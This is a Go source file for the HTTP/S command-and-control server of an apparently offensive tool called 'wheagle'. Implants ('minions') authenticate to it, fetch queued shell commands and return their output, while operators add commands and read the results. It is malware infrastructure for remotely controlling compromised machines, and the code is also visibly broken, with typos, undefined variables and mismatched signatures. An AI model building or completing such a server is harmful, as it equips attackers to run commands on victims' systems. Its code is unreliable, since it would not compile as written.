package lib

/*
  This package contains the handlers for the HTTP/S CnC
  Minion Functions are implemented(like grpcAdminServer)
*/
import(
  "net"
  "fmt"
  "bytes"
  "errors"
  "net/http"
  "crypto/tls"
  "odin/lib/utils"
  "odin/lib/core"
  "github.com/gorilla/sessions"
  "odin/wheagle/server/grpcapi"
)

var store = sessions.NewCookieStore([]byte(utils.RandNoLetter(30)))

type HTTPMS struct {
  ACave *core.Cave
  Config *MSRunner
  Plr *Pillar
  OS string
}

func NewHTTPMS(cave *core.Cave,config *MSRunner,pillar *Pillar) *HTTPMS{
  return &HTTPMS{
    ACave: cave,
    Config: config,
    APillar: pillar,
    OS: utils.GetCurrentOS(),
  }
}

func (ad *AdminData) StartMS(){
  cave := core.InitializeTunnelMan()
  pillar := InitializePillar()
  msr := SetRunningConfigurations(ad.Ad.MSId,ad.Ad.Password)
  srv := NewHTTPMS(cave,msr,pillar)
  http.HandleFunc("/auth/",srv.Authenticate)
  http.HandleFunc("/adminauth/",srv.AdminAuthenticate)
  http.HandleFunc("/getwork",srv.Getwork)
  http.HandleFunc("/output",srv.ReceiveOut)
  http.HandleFunc("/getout",srv.AdminGetOut)
  http.HandleFunc("/addwork",srv.AdminAddWork)
  http.HandleFunc("/sendfile",srv.Sendfile)
  http.HandleFunc("/recivefile",srv.ReceiveFile)
  switch ad.Ad.OProtocol {
  case "HTTPS":
    cert, err := tls.X509KeyPair([]byte(ad.Ad.CertPem),[]byte(ad.Ad.KeyPem))
    if err != nil{
      utils.Logerror(err);return
    }
    config := &tls.Config{Certificates: []tls.Certificate{cert}}
    server := &http.Server{
      Addr:"0.0.0.0:"+utils.IntToString(ad.Ad.OPort),
      TLSConfig: config,
    }
	  err = server.ListenAndServeTLS("", "")
    if err != nil{
     utils.Logerror(err);return
    }
  case "DNS":
  case "DOH":
  default:
    err := http.ListenAndServe("0.0.0.0:"+utils.IntToString(ad.Ad.OPort),nil)
    if err != nil {
      utils.CustomError("[+] Error starting HTTP server: ",err)
    }
  }
}

// use headers to register
// use parameters to get work
// send work back as a body
// encode the body
func (srv *HTTPMS) Sendfile(res http.ResponseWriter,req *http.Request){
  return
}


func (srv *HTTPMS) ReceiveFile(res http.ResponseWriter,req *http.Request){
  return
}


func (srv *HTTPMS) Getwork(res http.ResponseWriter,req *http.Request){
  mid,auth := srv.IsAuthenticated(req,false)
  if !auth{
    res.WriteHeader(http.StatusUnauthorized)
    fmr.Fprintf(res,"Login to get work.")
    return
  }
  var cmd = new(grpcapi.Command)
  //get work
  cmd.UserId = mid
  cmd,err := srv.Plr.GetWork(cmd)
  if err != nil{
    if errors.Is(err,ErrNoWork){
      res.WriteHeader(http.StatusNoContent)
      fmt.Fprintf(res,"No Work")
      return
    }
    http.Redirect(res,req,"/home",http.StatusFound)
    return
  }
  work,err := grpcapi.WorkEncode(cmd)
  if err != nil {
    utils.NoticeError(fmt.Sprintf("%s",err))
    http.Error(res,"Failed to encode the data.",http.StatusInternalServerError);return
  }
  res.Header().Set("Content-Type", "application/octet-stream")
  if _,err := res.Write(work); err != nil {
    utils.NoticeError(fmt.Sprintf("%s",err))
    http.Error(res,"Failed to write the response",http.StatusInternalServerError);return
  }
  return
}

func (srv *HTTPMS) ReceiveOut(res http.ResponseWriter,req *http.Request){
  if req.Method != "POST" {
    fmt.Fprintf(res,"Invalid method")
    return
  }
  _,auth := srv.IsAuthenticated(req,false)
  if !auth {
    res.WriteHeader(http.StatusUnauthorized)
    fmr.Fprintf(res,"Login to get work.")
    return
  }
  //read the body,decode it,say okay or try again
  cmd,err := DecodeCommandFromBody(req)
  if err != nil {
    utils.NoticeError(fmt.Sprintf("%s",err))
    fmt.Fprintf(res,"Try Again.")
  }
  if err := srv.AddWorkOutput(cmd); err != nil {
    utils.Logerror(err)
    fmt.Fprintf(res,"Try Again.")
  }
  res.WriteHeader(http.StatusOK)
	fmt.Fprintln(res, "Workout data received and processed successfully.")
}

// now make the clients

func (srv *HTTPMS) AdminAddWork(res http.ResponseWriter,req *http.Request){
  _,auth := srv.IsAuthenticated(req,true)
  cmd,err := DecodeCommandFromBody(req)
  if err != nil {
    utils.NoticeError(fmt.Sprintf("%s",err))
    fmt.Fprintf(res,"Try Again.")
  }
  work := &Jacuzzi{
    OperatorId: cmd.OperatorId,
    CmdIn: cmd.In,
    Done: false,
  }
  if err := srv.AddWork(cmd.UserId,work); err != nil {
    res.WriteHeader(http.StatusInternalServerError)
    fmt.Fprintf(res,fmt.Sprintf("%s",err))
    return
  }
  res.WriteHeader(http.StatusOK)
	fmt.Fprintln(res, "Workout data received and processed successfully.")
  return
}

func (srv *HTTPMS) AdminGetOut(res http.ResponseWriter,req *http.Request) {
  // a post request with cmd same that sent add work
  _,auth := srv.IsAuthenticated(req,true)
  if !auth {
    res.WriteHeader(http.StatusUnauthorized)
    fmt.Fprintf(res,"Authenticate first to get access to MotherShip.")
    return
  }
  cmd,err := DecodeCommandFromBody(req)
  if err != nil {
    res.WriteHeader(http.StatusInternalServerError)
    fmt.Fprintf(res,fmt.Sprintf("%s",err))
    return
  }
  wd,err := srv.GetWorkOut(cmd)
  if err != nil {
    fmt.Fprintf(res,fmt.Sprintf("Error getting output: %s",err));return
  }
  work,err := grpcapi.WorkEncode(wd)
  if err != nil {
    utils.NoticeError(fmt.Sprintf("%s",err))
    http.Error(res,"Failed to encode the data.",http.StatusInternalServerError);return
  }
  res.WriteHeader(http.StatusOK)
  res.Header().Set("Content-Type", "application/octet-stream")
  if _,err := res.Write(work); err != nil {
    utils.NoticeError(fmt.Sprintf("%s",err))
    http.Error(res,"Failed to write the response",http.StatusInternalServerError);return
  }
  return
}

func DecodeCommandFromBody(req *http.Request) (*grpcapi.Command, error) {
	// Ensure the request method is POST
	if req.Method != "POST" {
		return nil, fmt.Errorf("Invalid request method: %s", req.Method)
	}
	// Read the request body (encoded Command)
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return nil, fmt.Errorf("Failed to read request body: %s", err)
	}
	// Decode the body (encoded Command) into a Command struct
  return grpcapi.WorkDecode(body)
}

func (srv *HTTPMS) GetWorkOut(cmd *grpcapi.Command)(workDone *grpcapi.Command,err error){
  if workDone,err := srv.Plr.GetWorkDone(cmd); err != nil{
    return
  }
  return &workDone,nil
}

func (srv *HTTPMS) AddWorkOutput(result *grpcapi.Command) error {
  if err := srv.Plr.MarkAsDone(result); err != nil {
    return err
  }
  if result.In == "exit" || result.In == "suicide" {
    _ = srv.Plr.ClearOut(result.UserId)
    if err := srv.Plr.Deactivate(result);err != nil{
      return err
    }
  }
  return nil
}

func (srv *HTTPMS)  AddWork(cmd *grpcapi.Command) error {
  work := &Jacuzzi{
    OperatorId: cmd.OperatorId,
    CmdIn: cmd.In,
    Done: false,
  }
  return srv.Plr.AddWork(cmd.UserId,work)
}

// this should limit bad actors behind a vpn from using wheagle or limit them to one ip while sending commands
func (srv *HTTPMS) IsAuthenticated(req *http.Request,admin bool) (string,bool) {
  session,_ := store.Get(req,"session")
  var id string
  /* check if mutant
  if len(req.Header.Get("X-Mutant")) >= 0{
    /// add a session for mutant
    session.Values["MinionId"] = utils.GenerateUUID()
    session.Values["IP"] = req.RemoteAddr
    session.Save(req,res)
    return true
  }*/
  if admin{
    //check for admin auth
    id,ok := session.Values["OpId"].(string)
    if !ok {
      return id,false
    }
  } else {
    //check for implant auth
    ,ok := session.Values["MinionId"].(string)
    if !ok {
      return id,false
    }
  }
  return id,SessionValidateIP(req)
}

var SessionValidateIP = func(req *http.Request) bool{
  session,_ := store.Get(req,"session")
  ip,ok := session.Values["IP"]
  if !ok{ return false }
  if ip != req.RemoteAddr{
    //later on add to events
    return false
  }
  return true
}
// we can stilll use Auth but we need this eencoded in gob incases of http communication
func (srv *HTTPMS) Authenticate(res http.ResponseWriter,req *http.Request){
  if req.Method != "GET"{
    res.WriteHeader(http.StatusBadRequest)
    return
  }
  mid := req.URL.Query().Get("mid")
  msid := req.URL.Query().Get("msid")
  if srv.Config.MSId == msid{
    //proceed to add to pool
    _ = srv.Plr.NewPool(mid)
    if err := srv.Config.ADDMule(mid,msid); err != nil {
      // log the error and return an empty body
      utils.Notice(fmt.Sprintf("%s",err))
      res.WriteHeader(http.StatusInternalServerError)
      fmt.Fprintf(res,"Mule with ID Already exists.");return
    }
    session.Values["MinionId"] = mid
    session.Values["IP"] = req.RemoteAddr
    session.Save(req,res)
    res.WriteHeader(http.StatusOK)
  	fmt.Fprintln(res, "Successfully authenticated.")
    return
  }
  fmt.Fprintf(res,"Get your own mothership dummy!!.......")
  return
}

// add a way to encrypt the sent password
func (srv *HTTPMS) AdminAuthenticate(res http.ResponseWriter, req *http.Request){
  pass := req.URL.Query().Get("pass")
  if err :=  srv.Config.MSAuthenticate(pass){
    utils.Logerror(err)
    res.WriteHeader(http.StatusBadRequest)
    fmt.Fprintf(res,fmt.Sprintf("Error Authenticating admin: %s",err))
    return
  }
  // create an add operator method( base it on ip and opid)
  opid := utils.GenerateUUID()
  session.Values["OpId"] = opid
  session.Values["IP"] = req.RemoteAddr
  session.Save(req,res)
  res.WriteHeader(http.StatusOK)
  fmt.Fprintln(res, "Successfully authenticated.")
  return
}

func (srv *HTTPMS) Logout(res http.ResponseWriter, req *http.Request){
  val := req.URL.Query().Get("val")
  if val == "admin"{
    session,_ := store.Get(req,"session")
    delete(session.Values,"OpId")
    delete(session.Values,"IP")
    session.Save(req,res)
    fmt.Fprintf(res,"LOGGED OUT")
    return
  } else {
    session,_ := store.Get(req,"session")
    delete(session.Values,"MinionId")
    delete(session.Values,"IP")
    session.Save(req,res)
    fmt.Fprintf(res,"LOGGED OUT")
    return
  }
  res.WriteHeader(http.StatusOK)
  fmt.Fprintf(res,"You must take me for a fool.!!!")
  return
}


type DNS struct{
  Port int
  Tls bool
}

func (i *DNS) Serve(){}
